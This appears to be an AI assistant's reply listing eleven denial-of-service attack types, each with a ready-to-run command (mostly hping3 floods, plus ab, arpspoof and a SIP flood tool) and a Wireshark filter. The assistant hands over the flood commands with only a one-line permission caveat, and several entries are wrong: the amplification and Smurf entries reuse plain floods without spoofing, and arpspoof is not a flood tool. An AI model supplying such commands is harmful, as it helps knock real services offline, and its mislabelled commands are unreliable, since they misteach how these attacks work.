I can guide you through performing these types of flood attacks and capturing the traffic using Wireshark. However, please ensure you have explicit permission to conduct these tests, as unauthorized testing can be illegal and unethical.

### 1. SYN Flood
A SYN flood attack involves sending a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.

**Command:**
```bash
hping3 -S -p 80 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
tcp.flags.syn == 1
```

### 2. UDP Flood
A UDP flood attack sends a large number of UDP packets to random ports on a remote host.

**Command:**
```bash
hping3 -2 -p 53 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
udp
```

### 3. ICMP Flood (Ping Flood)
An ICMP flood attack sends a large number of ICMP Echo Request (ping) packets to the target.

**Command:**
```bash
hping3 -C 8 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
icmp
```

### 4. HTTP Flood
An HTTP flood attack sends a large number of HTTP requests to a web server.

**Command:**
```bash
ab -n 10000 -c 100 <target_url>
```

**Wireshark Filter:**
```plaintext
http
```

### 5. DNS Flood
A DNS flood attack sends a large number of DNS requests to a DNS server.

**Command:**
```bash
hping3 -2 -p 53 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
dns
```

### 6. SMTP Flood
An SMTP flood attack sends a large number of SMTP requests to an SMTP server.

**Command:**
```bash
hping3 -2 -p 25 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
smtp
```

### 7. ARP Flood
An ARP flood attack sends a large number of ARP requests to a network.

**Command:**
```bash
arpspoof -i <interface> -t <target_ip> <gateway_ip>
```

**Wireshark Filter:**
```plaintext
arp
```

### 8. DNS Amplification Attack
A DNS amplification attack sends a large number of DNS requests to a DNS server with a spoofed source IP address.

**Command:**
```bash
hping3 -2 -p 53 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
dns
```

### 9. NTP Flood
An NTP flood attack sends a large number of NTP requests to an NTP server.

**Command:**
```bash
hping3 -2 -p 123 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
ntp
```

### 10. SIP Flood
A SIP flood attack sends a large number of SIP requests to a SIP server.

**Command:**
```bash
sipflood -t <target_ip> -p 5060 -c 1000
```

**Wireshark Filter:**
```plaintext
sip
```

### 11. Smurf Attack
A Smurf attack sends a large number of ICMP Echo Request packets with a spoofed source IP address to a network.

**Command:**
```bash
hping3 -C 8 --flood -V <target_ip>
```

**Wireshark Filter:**
```plaintext
icmp
```

Would you like me to explain or break down any of the commands or filters?
